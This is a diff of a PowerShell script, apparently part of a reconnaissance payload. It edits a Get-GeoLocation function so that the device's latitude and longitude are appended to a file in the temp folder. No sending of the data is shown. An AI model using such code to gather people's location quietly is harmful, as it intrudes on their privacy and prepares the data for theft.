@@ -91,8 +91,8 @@ function Get-GeoLocation{
 	if ($GeoWatcher.Permission -eq 'Denied'){
 		Write-Error 'Access Denied for Location Information'
 	} else {
-		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
-		
+		$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
+		if ($GL) { echo "`nYour Location: `n$GL" >> $Env:temp\foo.txt }
 	}
 	}
     # Write Error is just for troubleshooting
@@ -103,8 +103,8 @@ function Get-GeoLocation{
 
 }
 
-$GL = Get-GeoLocation
-if ($GL) { echo "`nYour Location: `n$GL" >> $Env:temp\foo.txt }
+Get-GeoLocation
+#if ($GL) { echo "`nYour Location: `n$GL" >> $Env:temp\foo.txt }
 
 
 #############################################################################################################################################
